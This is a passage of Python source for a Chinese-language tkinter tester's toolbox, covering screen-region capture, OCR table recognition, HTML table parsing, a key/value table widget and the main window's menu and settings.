            # 预合成半暗底图：打开即整屏暗色（不用 stipple 半透明矩形，
            # 渲染与平台无关，选区外内容仍可辨认）
            self._dark_img = Image.blend(
                shot.convert("RGB"),
                Image.new("RGB", shot.size, (0, 0, 0)), 0.55)
            self._dark_photo = ImageTk.PhotoImage(self._dark_img, master=self)
            self.canvas.delete("all")
            self.canvas.create_image(0, 0, image=self._dark_photo, anchor="nw")
            self._hint_id = self.canvas.create_text(
                self.winfo_screenwidth() // 2, 30,
                text="拖动鼠标框选表格区域 | 松开后可拖动边角手柄调整、拖动内部移动 | ✔ 识别 / ✘ 取消 / ESC 取消",
                fill="white",
                font=("Microsoft YaHei UI", 14, "bold"),
            )
            self.canvas.tag_raise(self._hint_id)
        except Exception:
            self.finish(None)
            return

        # 绑定事件
        self.canvas.bind("<ButtonPress-1>", self._on_press)
        self.canvas.bind("<B1-Motion>", self._on_drag)
        self.canvas.bind("<ButtonRelease-1>", self._on_release)
        self.canvas.bind("<Motion>", self._on_hover)
        self.bind("<Escape>", self._on_cancel)

    # ---------------- 选区渲染 ----------------

    def _clear_overlays(self):
        for item in self._overlay_ids:
            self.canvas.delete(item)
        self._overlay_ids.clear()

    def _handle_positions(self, sel=None):
        """8 个手柄位置：四角 + 四边中点"""
        x1, y1, x2, y2 = sel if sel else self._sel_coords
        cx, cy = (x1 + x2) // 2, (y1 + y2) // 2
        return {"nw": (x1, y1), "n": (cx, y1), "ne": (x2, y1),
                "e": (x2, cy), "se": (x2, y2), "s": (cx, y2),
                "sw": (x1, y2), "w": (x1, cy)}

    def _render_selection(self):
        """重绘选区：亮色区域 + 蓝色边框 + 8 个白色手柄 + 尺寸标签"""
        self._clear_overlays()
        c = self.canvas
        if self._sel_coords is None:
            if self._hint_id is not None:
                c.tag_raise(self._hint_id)
            return
        x1, y1, x2, y2 = self._sel_coords
        # 亮色选区：从亮色截图裁剪贴到暗色底图上
        crop = self._screen_img.crop((x1, y1, x2, y2))
        self._bright_photo = ImageTk.PhotoImage(crop, master=self)
        ids = [c.create_image(x1, y1, image=self._bright_photo, anchor="nw"),
               c.create_rectangle(x1, y1, x2, y2, outline="#1e6fd9", width=2)]
        # 调整手柄（四角 + 四边中点）
        r = 4
        for hx, hy in self._handle_positions().values():
            ids.append(c.create_rectangle(hx - r, hy - r, hx + r, hy + r,
                                          fill="white", outline="#1e6fd9", width=1))
        # 尺寸标签（选区上方，越界放选区内顶部）
        label_y = y1 - 14 if y1 - 14 > 26 else y1 + 16
        ids.append(c.create_text(x1, label_y, anchor="w", fill="#ffe97f",
                                 font=("Microsoft YaHei UI", 10, "bold"),
                                 text=f"{x2 - x1} × {y2 - y1}"))
        self._overlay_ids = ids
        if self._hint_id is not None:
            c.tag_raise(self._hint_id)

    def _schedule_render(self):
        """合并同一事件循环内的多次重绘请求（拖拽流畅）"""
        if self._render_pending:
            return
        self._render_pending = True
        self.after_idle(self._do_render)

    def _do_render(self):
        self._render_pending = False
        if self.winfo_exists():
            self._render_selection()

    def _hide_toolbar(self):
        if self._toolbar is not None:
            self._toolbar.dismiss()
            self._toolbar = None

    # ---------------- 命中测试与光标 ----------------

    def _hit_test(self, x, y):
        """返回 ('handle', 名称) / ('inside', None) / ('outside', None)"""
        if self._sel_coords is None:
            return ("outside", None)
        for name, (hx, hy) in self._handle_positions().items():
            if abs(x - hx) <= self._HANDLE_R and abs(y - hy) <= self._HANDLE_R:
                return ("handle", name)
        x1, y1, x2, y2 = self._sel_coords
        if x1 < x < x2 and y1 < y < y2:
            return ("inside", None)
        return ("outside", None)

    _HANDLE_CURSORS = {"nw": "size_nw_se", "se": "size_nw_se",
                       "ne": "size_ne_sw", "sw": "size_ne_sw",
                       "n": "size_ns", "s": "size_ns",
                       "e": "size_we", "w": "size_we"}

    def _on_hover(self, event):
        """未按下时根据悬停位置切换光标，提示可调整/移动/新选"""
        if self._screen_img is None or self._mode is not None:
            return
        kind, handle = self._hit_test(event.x, event.y)
        if kind == "handle":
            self.canvas.config(cursor=self._HANDLE_CURSORS[handle])
        elif kind == "inside":
            self.canvas.config(cursor="fleur")
        else:
            self.canvas.config(cursor="cross")

    # ---------------- 鼠标交互 ----------------

    def _on_press(self, event):
        if self._screen_img is None:
            return
        kind, handle = self._hit_test(event.x, event.y)
        self._hide_toolbar()
        self._press_x, self._press_y = event.x, event.y
        self._orig_sel = self._sel_coords
        if kind == "handle":
            self._mode, self._handle = "resize", handle
        elif kind == "inside":
            self._mode, self._handle = "move", None
        else:
            # 选区外按下：开始框选新区域
            self._mode, self._handle = "new", None
            self._sel_coords = None
            self.start_x, self.start_y = event.x, event.y
            self._render_selection()

    def _on_drag(self, event):
        if self._screen_img is None or self._mode is None:
            return
        W, H = self.winfo_screenwidth(), self.winfo_screenheight()
        if self._mode == "new":
            x1, y1 = min(self.start_x, event.x), min(self.start_y, event.y)
            x2, y2 = max(self.start_x, event.x), max(self.start_y, event.y)
            self._sel_coords = (x1, y1, x2, y2)
        elif self._mode == "move":
            # 拖动选区内部：整体平移（限制在屏幕内）
            x1, y1, x2, y2 = self._orig_sel
            dx = max(-x1, min(event.x - self._press_x, W - x2))
            dy = max(-y1, min(event.y - self._press_y, H - y2))
            self._sel_coords = (x1 + dx, y1 + dy, x2 + dx, y2 + dy)
        elif self._mode == "resize":
            # 拖动手柄：调整对应边/角，不允许越过对边（保持最小尺寸）
            x1, y1, x2, y2 = self._orig_sel
            h = self._handle
            m = self._MIN_SIZE
            if "n" in h:
                y1 = max(0, min(event.y, y2 - m))
            if "s" in h:
                y2 = min(H - 1, max(event.y, y1 + m))
            if "w" in h:
                x1 = max(0, min(event.x, x2 - m))
            if "e" in h:
                x2 = min(W - 1, max(event.x, x1 + m))
            self._sel_coords = (x1, y1, x2, y2)
        self._schedule_render()

    def _on_release(self, event):
        # 背景未就绪时 _on_press 被忽略：release 也必须忽略，
        # 否则会以 (0,0) 为起点算出用户从未拖出的幻影选区
        if self._screen_img is None or self._mode is None:
            return
        mode = self._mode
        self._mode = None
        if mode == "new" and self._sel_coords is not None:
            # 新框选：过小视为误点击，取消整个截图
            x1, y1, x2, y2 = self._sel_coords
            if x2 - x1 < self._MIN_SIZE or y2 - y1 < self._MIN_SIZE:
                self._on_cancel()
                return
        if self._sel_coords is None:
            return
        self._render_selection()
        x1, y1, x2, y2 = self._sel_coords
        self._toolbar = ConfirmToolbar(
            self, x2 + 6, y2 + 6,
            on_confirm=self._confirm_selection,
            on_cancel=lambda: self.finish(None),
        )

    def _confirm_selection(self):
        if not self._sel_coords:
            self.finish(None)
            return
        x1, y1, x2, y2 = self._sel_coords
        # 显示层为逻辑坐标，原始截屏为物理像素：按缩放比例换算后再裁剪，
        # 修复高 DPI 屏幕下"选的区和得到的图不一致"的问题
        img = None
        if abs(self._scale_x - 1.0) > 1e-6 or abs(self._scale_y - 1.0) > 1e-6:
            # 显示层是逻辑坐标、原始截图是物理像素：按比例换算后从原始截图裁剪，
            # 保证高 DPI 屏幕下"选的区"与"得到的图"完全一致且保持原生分辨率
            base = self._orig_img
            px1 = round(x1 * self._scale_x); py1 = round(y1 * self._scale_y)
            px2 = round(x2 * self._scale_x); py2 = round(y2 * self._scale_y)
            px1, py1 = max(0, min(px1, base.width - 1)), max(0, min(py1, base.height - 1))
            px2, py2 = max(1, min(px2, base.width)), max(1, min(py2, base.height))
            img = base.crop((px1, py1, px2, py2))
        elif self._screen_img is not None:
            img = self._screen_img.crop((x1, y1, x2, y2))
        self._result_image = img
        self.finish(img)

    def finish(self, image):
        """统一出口：隐藏窗口后回调"""
        self.withdraw()
        self.update()
        self._hide_toolbar()
        if self.callback:
            self.callback(image)
        self.destroy()

    def _on_cancel(self, event=None):
        self._result_image = None
        self._hide_toolbar()
        if self.callback:
            self.callback(None)
        self.destroy()


def capture_region(parent=None, callback=None):
    _load_heavy_modules()
    """弹出区域选择窗口，确认截图后通过callback返回PIL.Image，取消返回None"""
    selector = RegionSelector(parent=parent, callback=callback)
    return selector


def recognize_table(image_path_or_pil):
    _load_heavy_modules()
    """识别图片中的表格（使用paddlex table_recognition流水线）"""
    import numpy as np
    import time

    predict_input = image_path_or_pil
    if isinstance(image_path_or_pil, Image.Image):
        w, h = image_path_or_pil.size
        print(f"[识别] 输入图像 {w}x{h}")
        # 小图放大 2 倍：截图文字偏小（100% DPI 下一行文字约 12-20px 高），
        # 是 OCR 检测/识别的主要失分点；det 内部会按 limit_side_len=960
        # 归一化长边，放大几乎不增加耗时
        if min(w, h) < 640:
            image_path_or_pil = image_path_or_pil.resize((w * 2, h * 2), Image.LANCZOS)
            print("[识别] 图像较小，已放大 2 倍以提高识别准确率")
        # 直接转 BGR ndarray 喂给流水线，避免临时 PNG 的编码+磁盘读写开销
        rgb = np.asarray(image_path_or_pil.convert("RGB"))
        predict_input = cv2.cvtColor(rgb, cv2.COLOR_RGB2BGR)

    # 复用全局缓存的流水线，避免每次识别都重新加载模型（首次加载可能需数十秒）
    pipeline = _get_table_pipeline()
    t0 = time.time()
    # 截图模式：用户已框选表格区域，整张图就是表格——
    # 双重保险：流水线创建时已不加载这三个子模型（见 _get_table_pipeline），
    # 此处再显式关闭推理开关（截图不存在旋转/弯曲，也无需检测版面）
    output = list(pipeline.predict(
        input=predict_input,
        use_doc_orientation_classify=False,
        use_doc_unwarping=False,
        use_layout_detection=False,
    ))
    print(f"[识别] 推理完成，用时 {time.time() - t0:.1f} 秒，正在解析结果...")

    all_table_data = []
    html_parts = []

    for res in output:
        html_dict = res.html if hasattr(res, 'html') else {}
        if isinstance(html_dict, dict):
            for key, html_str in html_dict.items():
                if html_str:
                    html_parts.append(html_str)
                    table_data = html_to_table_data(html_str)
                    if table_data:
                        all_table_data.extend(table_data)
        elif isinstance(html_dict, str) and html_dict:
            html_parts.append(html_dict)
            table_data = html_to_table_data(html_dict)
            if table_data:
                all_table_data.extend(table_data)

    combined_html = "\n".join(html_parts) if html_parts else ""
    return all_table_data, combined_html


# CJK 字符与中文标点（用于单元格文本归一化）
_CJK_CHARS = ("\u4e00-\u9fff\u3000-\u303f"      # 汉字 + CJK 标点
              "\uff00-\uffef")                   # 全角符号（，。、；：！？（）等）
# OCR 偶发在中文旁输出多余空格（如"拆分、 识别"），同配置不同进程表现不一，
# 属模型固有抖动——用确定性后处理根治：
# 1. CJK 字符旁的空白剔除（纯英文单词间距保留，如 "New York"）
_CELL_SPACE_RE = re.compile(
    rf"(?<=[{_CJK_CHARS}])\s+(?=[{_CJK_CHARS}])|"
    rf"(?<=[{_CJK_CHARS}])\s+(?=[A-Za-z0-9])|"
    rf"(?<=[A-Za-z0-9])\s+(?=[{_CJK_CHARS}])")
# 2. 两个 CJK 字符之间的半角标点还原为全角（如"详情,删除"→"详情，删除"；
#    数字旁的半角标点不动，如 "1,000"）
_CELL_PUNCT_RE = re.compile(
    rf"(?<=[{_CJK_CHARS}])([,;:?!])(?=[{_CJK_CHARS}])")
_PUNCT_MAP = {",": "，", ";": "；", ":": "：", "?": "？", "!": "！"}


def _clean_cell_text(text):
    """单元格文本归一化：去 CJK 旁多余空格 + 还原 CJK 间半角标点"""
    text = _CELL_SPACE_RE.sub("", text)
    text = _CELL_PUNCT_RE.sub(lambda m: _PUNCT_MAP[m.group(1)], text)
    return text


def html_to_table_data(html):
    """将HTML表格转换为二维列表（展开 colspan/rowspan，保证行列对齐）"""
    rows = []
    tr_pattern = re.compile(r"<tr[^>]*>(.*?)</tr>", re.DOTALL | re.IGNORECASE)
    td_pattern = re.compile(r"<t[dh]([^>]*)>(.*?)</t[dh]>", re.DOTALL | re.IGNORECASE)
    span_pattern = re.compile(r"(colspan|rowspan)\s*=\s*\"?(\d+)\"?", re.IGNORECASE)

    # rowspan 跨行延续：{列号: [剩余行数, 单元格文本]}
    pending = {}

    def drain_pending(col):
        """放置该列由上方 rowspan 延续下来的单元格，返回 (文本列表, 新列号)"""
        out = []
        while col in pending:
            out.append(pending[col][1])
            remain = pending[col][0] - 1
            if remain <= 0:
                del pending[col]
            else:
                pending[col] = (remain, pending[col][1])
            col += 1
        return out, col

    for tr_match in tr_pattern.finditer(html):
        tr_content = tr_match.group(1)
        cells = []
        col = 0
        for td_match in td_pattern.finditer(tr_content):
            # 先让上方 rowspan 延续的单元格就位，再放当前单元格
            cont, col = drain_pending(col)
            cells.extend(cont)

            attrs, cell_text = td_match.group(1), td_match.group(2)
            cell_text = _clean_cell_text(re.sub(r"<[^>]+>", "", cell_text))
            colspan = rowspan = 1
            for name, val in span_pattern.findall(attrs):
                if name.lower() == "colspan":
                    colspan = max(1, int(val))
                else:
                    rowspan = max(1, int(val))
            for _ in range(colspan):
                cells.append(cell_text)
                if rowspan > 1:
                    pending[col] = (rowspan - 1, cell_text)
                col += 1
        # 行尾仍有 rowspan 延续时补齐
        cont, _ = drain_pending(col)
        cells.extend(cont)
        if cells:
            rows.append(cells)

    return rows


def table_data_to_tsv(table_data):
    """将二维列表转换为TSV格式（Tab分隔，可直接粘贴到Excel）"""
    if not table_data:
        return ""

    lines = []
    for row in table_data:
        line = "\t".join(str(cell) for cell in row)
        lines.append(line)
    return "\n".join(lines)


def table_data_to_clipboard(widget, table_data):
    """将表格数据复制到剪贴板（TSV格式）"""
    tsv = table_data_to_tsv(table_data)
    widget.clipboard_clear()
    widget.clipboard_append(tsv)
    return tsv


# ==================== 主程序 ====================

APP_NAME = "测试工具箱"
APP_VERSION = "1.0.0"

IMAGE_EXTS = [
    ("图片文件", "*.jpg *.jpeg *.png *.bmp *.tiff *.tif *.gif"),
    ("所有文件", "*.*"),
]


class LogBuffer:
    """线程安全的标准输出重定向缓冲"""

    def __init__(self):
        self._data = []
        self._lock = threading.Lock()

    def write(self, s):
        with self._lock:
            self._data.append(s)

    def flush(self):
        pass

    def read_and_clear(self):
        with self._lock:
            data = "".join(self._data)
            self._data.clear()
        return data


class KeyValueTable(tk.Frame):
    """带单元格边框的 Key/Value 街格，支持鼠标滚轮滚动。

    交互规则：
    - 单击单元格：仅选中该行（整行高亮），不进入编辑
    - 双击单元格：进入编辑状态，失焦后自动保存并退出编辑
    - insert：每次调用追加一空行
    - delete：删除指定行；配合 selection() 可实现"选中删选中行、否则删最后一行"
    """

    SEL_BG = "#cde5f7"      # 选中行高亮色
    NORMAL_BG = "white"

    def __init__(self, master, headings=("Key", "Value"), height=4, **kw):
        super().__init__(master, bg="#95a5a6")
        self._headings = list(headings)
        self._ids = []
        self._entries = {}
        self._next_id = 0
        self._selected = None
        # Canvas + 内部 Frame 实现滚动
        self._canvas = tk.Canvas(self, bg="white", highlightthickness=0, bd=0)
        self._inner = tk.Frame(self._canvas, bg="white")
        self._canvas_win = self._canvas.create_window((0, 0), window=self._inner, anchor="nw")
        self._canvas.pack(side="left", fill="both", expand=True)
        self._inner.bind("<Configure>", lambda e: self._canvas.configure(scrollregion=self._canvas.bbox("all")))
        self._canvas.bind("<Configure>", self._on_canvas_resize)
        self._canvas.bind("<MouseWheel>", self._on_mousewheel)
        self._inner.bind("<MouseWheel>", self._on_mousewheel)
        for i in range(len(self._headings)):
            self._inner.columnconfigure(i, weight=1)
        for i, h in enumerate(self._headings):
            tk.Label(self._inner, text=h, bg="#dfe6ee", fg="#2c3e50",
                     font=("Microsoft YaHei UI", 9, "bold"),
                     relief="solid", bd=1, padx=4, pady=1
                     ).grid(row=0, column=i, sticky="nsew")
        self._inner.rowconfigure(0, weight=0)

    def _on_canvas_resize(self, event):
        self._canvas.itemconfig(self._canvas_win, width=event.width)

    def _on_mousewheel(self, event):
        self._canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")

    def _col_index(self, column):
        if isinstance(column, int):
            return column
        if isinstance(column, str) and column.startswith("#"):
            try:
                return int(column[1:]) - 1
            except ValueError:
                return 0
        return 0

    def _relayout(self):
        """删除行后重排剩余行的 grid 位置"""
        for ridx, rid in enumerate(self._ids, start=1):
            for c in range(len(self._headings)):
                en = self._entries.get((rid, c))
                if en is not None:
                    en.grid(row=ridx, column=c, sticky="nsew", ipady=1)

    def _select_row(self, rid):
        """选中一行：整行高亮；再次点击同一行则取消选中"""
        if self._selected == rid:
            rid = None
        self._selected = rid
        for (r, _c), en in self._entries.items():
            en.configure(bg=self.SEL_BG if r == rid else self.NORMAL_BG,
                         readonlybackground=self.SEL_BG if r == rid else self.NORMAL_BG)

    def _begin_edit(self, rid, c, en, x=0):
        """双击进入编辑，光标定位到鼠标点击位置"""
        self._selected = rid
        for (r, _cc), e2 in self._entries.items():
            e2.configure(bg=self.SEL_BG if r == rid else self.NORMAL_BG,
                         readonlybackground=self.SEL_BG if r == rid else self.NORMAL_BG)
        en.configure(state="normal")
        en.focus_set()
        en.icursor(en.index(f"@{x}"))

    def _end_edit(self, rid, c, en):
        """失焦退出编辑，回到只读（内容保留在 Entry 中即最终值）"""
        en.configure(state="readonly")

    def _on_cell_click(self, rid, c, en):
        """单击：仅选中行，不进入编辑；编辑状态时允许点击定位光标"""
        if en.cget("state") == "normal":
            return
        self._select_row(rid)
        return "break"

    def _on_cell_double(self, rid, c, en, x=0):
        self._begin_edit(rid, c, en, x)
        return "break"

    # ---- 兼容原 Treeview 的 API 子集 ----
    def insert(self, parent, index, values=("", "")):
        rid = "i%d" % self._next_id
        self._next_id += 1
        r = len(self._ids) + 1
        for c in range(len(self._headings)):
            e = tk.Entry(self._inner, relief="solid", bd=1, justify="left",
                         font=("Microsoft YaHei UI", 9),
                         state="normal",
                         insertbackground="black", takefocus=False)
            e.grid(row=r, column=c, sticky="nsew", ipady=1)
            e.insert(0, str(values[c]) if c < len(values) else "")
            e.configure(state="readonly", readonlybackground="white")
            e.bind("<Button-1>", lambda _e, rr=rid, cc=c, en=e: self._on_cell_click(rr, cc, en))
            e.bind("<Double-Button-1>", lambda _e, rr=rid, cc=c, en=e: self._on_cell_double(rr, cc, en, _e.x))
            e.bind("<FocusOut>", lambda _e, rr=rid, cc=c, en=e: self._end_edit(rr, cc, en))
            e.bind("<Return>", lambda _e, ee=e: ee.master.focus_set())
            self._entries[(rid, c)] = e
        self._inner.rowconfigure(r, weight=0)
        self._ids.append(rid)
        return rid

    def delete(self, *items):
        changed = False
        for it in items:
            if it in self._ids:
                for c in range(len(self._headings)):
                    en = self._entries.pop((it, c), None)
                    if en is not None:
                        en.destroy()
                self._ids.remove(it)
                changed = True
        if changed:
            if self._selected not in self._ids:
                self._selected = None
            self._relayout()

    def selection(self):
        """返回当前选中行；无选中返回空元组"""
        if self._selected is not None and self._selected in self._ids:
            return (self._selected,)
        return ()

    def get_children(self):
        return list(self._ids)

    def item(self, item_id, option=None):
        vals = tuple(self._entries[(item_id, c)].get()
                     for c in range(len(self._headings)))
        if option == "values":
            return vals
        return {"values": vals}

    def set(self, item_id, column, value):
        c = self._col_index(column)
        en = self._entries.get((item_id, c))
        if en is not None:
            en.configure(state="normal")
            en.delete(0, "end")
            en.insert(0, str(value))
            en.configure(state="readonly", readonlybackground="white")

    def identify_region(self, x, y):
        return "cell"

    def identify_column(self, x):
        total = max(self.winfo_width(), 1)
        n = len(self._headings)
        return "#%d" % min(int(x * n / total) + 1, n)

    def identify_row(self, y):
        rowh = 26
        idx = (y - 22) // rowh
        if 0 <= idx < len(self._ids):
            return self._ids[idx]
        return ""

    def bbox(self, item_id, column=None):
        en = self._entries.get((item_id, self._col_index(column)))
        if en is None:
            return ""
        return (en.winfo_x(), en.winfo_y(), en.winfo_width(), en.winfo_height())

    def yview(self, *args):
        self._canvas.yview(*args)

    def yview_moveto(self, fraction):
        self._canvas.yview_moveto(fraction)


class ToolboxApp(tk.Tk):
    def __init__(self):
        super().__init__()
        # 设置ttk样式：Combobox下拉列表白色背景
        style = ttk.Style()
        style.configure("TCombobox", fieldbackground="white", background="white")
        # 修复：本窗口创建时默认根还是启动加载窗，若不切换，
        # __init__ 里创建的 IntVar/StringVar 都挂在加载窗上，加载窗销毁后全部失效，
        # 导致所有功能页按钮消失。这里立刻把默认根指回主窗口。
        tk._default_root = self
        self.title(f"{APP_NAME} v{APP_VERSION}")
        self.geometry("980x680")
        self.minsize(820, 560)
        self.protocol("WM_DELETE_WINDOW", self._on_close)

        self._font_size_var = tk.IntVar(value=10)
        self._setup_menu_bar()

        self._buffer = LogBuffer()
        self._poll_job = None
        self._task_thread = None
        self._running = False
        self._page_frames = {}
        self.ABOUT_PAGE_INDEX = 12  # 菜单顺序: ...截图识别表格(11) 设置(13) 关于(12)
        self._page_logs = {}
        self._current_menu_index = None
        self._log_owner = None
        self._task_page = None

        # 持久化变量（切换页面时保留值）
        DEFAULT_DATA = os.path.join(_APP_DIR, "data")
        self._pdf_images = []
        self._pdf_out_var = tk.StringVar(value=DEFAULT_DATA)
        self._zip_images = []
        self._zip_out_var = tk.StringVar(value=DEFAULT_DATA)
        self._split_in_var = tk.StringVar()
        self._split_size_var = tk.StringVar(value="101")
        self._split_out_var = tk.StringVar(value=DEFAULT_DATA)
        self._split_prefix_var = tk.StringVar(value="part")
        self._merge_files = []
        self._merge_out_var = tk.StringVar(value=DEFAULT_DATA)
        self._gen_size_var = tk.StringVar(value="101")
        self._gen_type_var = tk.StringVar(value="zip")
        self._gen_corrupt_var = tk.StringVar(value="正常")
        self._gen_corrupt_method_var = tk.StringVar(value="header_tail")
        self._gen_out_var = tk.StringVar(value=DEFAULT_DATA)
        self._text_len_var = tk.StringVar(value="100")
        self._text_type_var = tk.StringVar(value="汉字+英文+中英文标点")
        self._http_url_var = tk.StringVar(value="https://www.bing.com")
        # 后台日志（开发用）：记录启动以来的所有日志，级别可调，默认 INFO
        self._dev_log_records = []          # [(时间, 级别, 内容)]
        self._dev_log_level = "INFO"
        self._DEV_LOG_LEVELS = ["DEBUG", "INFO", "WARNING", "ERROR"]

        # 随机人员信息相关变量
        self._person_data = []

        # OCR表格识别相关变量
        self._ocr_hotkey_var = tk.StringVar(value="Ctrl+Shift+T")

        # ---- 统一设置持久化：所有设置类变量启动时恢复、变化即保存（一个逻辑） ----
        self._setting_vars = {
            "pdf_out": self._pdf_out_var,
            "zip_out": self._zip_out_var,
            "split_in": self._split_in_var,
            "split_size": self._split_size_var,
            "split_out": self._split_out_var,
            "split_prefix": self._split_prefix_var,
            "merge_out": self._merge_out_var,
            "gen_size": self._gen_size_var,
            "gen_type": self._gen_type_var,
            "gen_corrupt": self._gen_corrupt_var,
            "gen_corrupt_method": self._gen_corrupt_method_var,
            "gen_out": self._gen_out_var,
            "text_len": self._text_len_var,
            "text_type": self._text_type_var,
            "http_url": self._http_url_var,
            "ocr_hotkey": self._ocr_hotkey_var,
        }
        for _key, _var in self._setting_vars.items():
            _saved = _read_config(f"setting_{_key}")
            if _saved is not None and _saved != "":
                try:
                    _var.set(_saved)
                except Exception:
                    pass
            _var.trace_add("write", lambda *_a, k=_key, v=_var:
                           _write_config(f"setting_{k}", v.get()))
        self._ocr_table_data = []
        self._ocr_listener = None
        self._ocr_selecting = False   # 区域选择器已打开（防快捷键重入）
        self._ocr_downloading = None  # 正在后台下载的模型 label（防重复下载）
        self._storage_migrating = False  # 存储位置迁移进行中（防重复迁移/下载冲突）

        # 全局字体缩放系数（设置页调整，持久化到配置文件 ui_font_scale 以便重启保留）
        try:
            self._font_scale = float(_read_config("ui_font_scale"))
        except Exception:
            self._font_scale = 1.0
        if not (0.5 <= self._font_scale <= 3.0):
            self._font_scale = 1.0
        self._font_base = {}     # 控件 -> 原始字体信息（首次遍历时记录）
        _boot_progress(10, "正在构建主窗口...")
        self._build_ui()
        _boot_progress(70, "主界面构建完成，加载默认页面...")
        self._select_menu(0)
        _boot_progress(95, "准备就绪")
        # 全局快捷键启动即生效：页面是懒构建的，若只在 OCR 页初始化，
        # 用户不访问该页则快捷键永远不会激活
        self._init_ocr_hotkey()

    # ---------------- UI 搭建 ----------------
    # 菜单结构：一级为分组名（可折叠），二级为功能页；独立功能（组名为 None）保持一级
    _MENU_GROUPS = [
        ("文件处理", [0, 1, 2, 3]),       # 图片转PDF/图片批量转ZIP/文件分割/文件合并
        ("数据生成", [4, 5, 6]),          # 生成指定大小文件/生成指定长度文本/随机人员信息
        ("开发工具", [8, 7, 9, 10]),      # 接口请求/URL编码解码/JSON格式化/JSON对比
        ("安全测试", [14]),               # 数据注入
        (None, [11, 13, 12]),             # 截图识别表格/设置/关于（独立功能不分组，设置在关于上方）
    ]

    def _build_ui(self):
        left = tk.Frame(self, bg="#2c3e50", width=200)
        left.pack(side="left", fill="both", expand=False)
        left.pack_propagate(False)
        self._menu_frame = left

        tk.Label(left, text="功能菜单", fg="white", bg="#2c3e50",
                 font=("Microsoft YaHei UI", 14, "bold")).pack(pady=(20, 10))

        self._build_menu(left)
        _boot_progress(30, "正在构建功能页面...")

        right = tk.Frame(self, bg="#f5f6fa")
        right.pack(side="left", fill="both", expand=True)

        self.title_label = tk.Label(right, bg="#f5f6fa", fg="#2c3e50",
                                    font=("Microsoft YaHei UI", 16, "bold"))
        self.title_label.pack(anchor="w", padx=20, pady=(15, 5))

        self.content = None
        self.page_container = tk.Frame(right, bg="#f5f6fa")
        self.page_container.pack(fill="both", expand=True, padx=20, pady=(0, 10))

        self._loading_overlay = tk.Frame(self.page_container, bg="#2c3e50", cursor="watch")
        self._loading_label = tk.Label(
            self._loading_overlay,
            text="⏳ 任务进行中，请稍候...",
            bg="#2c3e50", fg="white",
            font=("Microsoft YaHei UI", 14, "bold")
        )
        self._loading_label.pack(expand=True)
        self._loading_overlay.lower()

        self.log_frame = tk.LabelFrame(right, text="运行日志", bg="#f5f6fa",
                                       font=("Microsoft YaHei UI", 10))
        self.log_frame.pack(fill="both", expand=True, padx=20, pady=(0, 15))

        self.log = tk.Text(self.log_frame, height=14, bg="#2d3436", fg="#b2bec3",
                            font=("Consolas", 9), state="disabled", wrap="word")
        self.log.pack(fill="both", expand=True, padx=5, pady=5)
        self.log.tag_config("ok", foreground="#2ecc71",
                            font=("Microsoft YaHei UI", 12, "bold"))
        self.log.tag_config("err", foreground="#e74c3c",
                            font=("Microsoft YaHei UI", 12, "bold"))
        # Windows 下滚轮事件只发给焦点控件，而 disabled 的 Text 无法通过点击获得焦点，
        # 导致鼠标悬停在日志上滚动无效——鼠标进入时主动接管焦点即可滚动查看日志
        self.log.bind("<Enter>", lambda e: self.log.focus_set())
        self.log.bind("<MouseWheel>",
                      lambda e: self.log.yview_scroll(-1 * int(e.delta / 120), "units"))

        # 日志底部按钮
        log_btn_frame = tk.Frame(self.log_frame, bg="#f5f6fa")
        log_btn_frame.pack(fill="x", padx=5, pady=(0, 5))
        tk.Button(log_btn_frame, text="清空日志", command=self._log_clear,
                  width=10).pack(side="left", padx=4)
        tk.Button(log_btn_frame, text="导出日志", command=self._log_export,
                  width=10).pack(side="left", padx=4)

    # ---------------- 菜单切换 ----------------
    def _build_menu(self, parent):
        """构建二级分组菜单：组头可折叠/展开，组内为功能项；独立功能直接一级显示"""
        self._menu_item_labels = {}  # 页面索引 -> 菜单项 label
        canvas = tk.Canvas(parent, bg="#2c3e50", highlightthickness=0)
        canvas.configure(yscrollcommand=lambda *a: None)
        container = tk.Frame(canvas, bg="#2c3e50", padx=8, pady=8)
        canvas.pack(side="left", fill="both", expand=True)
        canvas.create_window((0, 0), window=container, anchor="nw")
        container.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        self._menu_canvas = canvas

        def _on_mousewheel(event):
            mx, my = event.x_root, event.y_root
            fx, fy = self._menu_frame.winfo_rootx(), self._menu_frame.winfo_rooty()
            fw, fh = self._menu_frame.winfo_width(), self._menu_frame.winfo_height()
            if fx <= mx <= fx + fw and fy <= my <= fy + fh:
                canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")
        canvas.bind_all("<MouseWheel>", _on_mousewheel)

        for group, indices in self._MENU_GROUPS:
            if group is None:
                for idx in indices:
                    self._make_menu_item(container, idx, indent=False)
                continue
            body = tk.Frame(container, bg="#2c3e50")
            header = tk.Label(
                container, text="▾ " + group, anchor="w", cursor="hand2",
                fg="#95a5a6", bg="#2c3e50",
                font=("Microsoft YaHei UI", 10, "bold"))
            header.pack(fill="x", pady=(8, 2))
            # 紧跟组头之后 pack，保证子菜单显示在对应一级菜单下面；
            # 重新展开时也用 after=header 固定位置（否则会 pack 到末尾）
            body.pack(fill="x", after=header)

            def _toggle(h=header, b=body, g=group):
                if b.winfo_ismapped():
                    b.pack_forget()
                    h.config(text="▸ " + g)
                else:
                    b.pack(fill="x", after=h)
                    h.config(text="▾ " + g)

            header.bind("<Button-1>", lambda e, t=_toggle: t())
            for idx in indices:
                self._make_menu_item(body, idx, indent=True)

    def _make_menu_item(self, parent, index, indent):
        """单个菜单项：悬停高亮，选中后青色底"""
        pad = 18 if indent else 0
        label = tk.Label(
            parent, text=self._page_title(index), anchor="w", cursor="hand2",
            fg="#ecf0f1", bg="#34495e", padx=10 + pad, pady=5,
            font=("Microsoft YaHei UI", 10))
        label.pack(fill="x", pady=1)

        def _hover(_e, l=label):
            if self._current_menu_index != index:
                l.config(bg="#3d566e")

        def _leave(_e, l=label):
            if self._current_menu_index != index:
                l.config(bg="#34495e")

        label.bind("<Enter>", _hover)
        label.bind("<Leave>", _leave)
        label.bind("<Button-1>", lambda e: self._select_menu(index))
        self._menu_item_labels[index] = label

    def _update_menu_highlight(self):
        """选中的菜单项青色高亮，其余恢复常态"""
        for idx, label in self._menu_item_labels.items():
            if idx == self._current_menu_index:
                label.config(bg="#1abc9c", fg="white")
            else:
                label.config(bg="#34495e", fg="#ecf0f1")

    def _page_title(self, index):
        return ["图片转 PDF", "单图单PDF转ZIP", "文件分割", "文件合并",
                "生成指定大小文件", "生成指定长度文本", "随机人员信息",
                "URL编码解码", "接口请求", "JSON格式化", "JSON对比", "截图识别表格", "关于", "设置", "数据注入"][index]

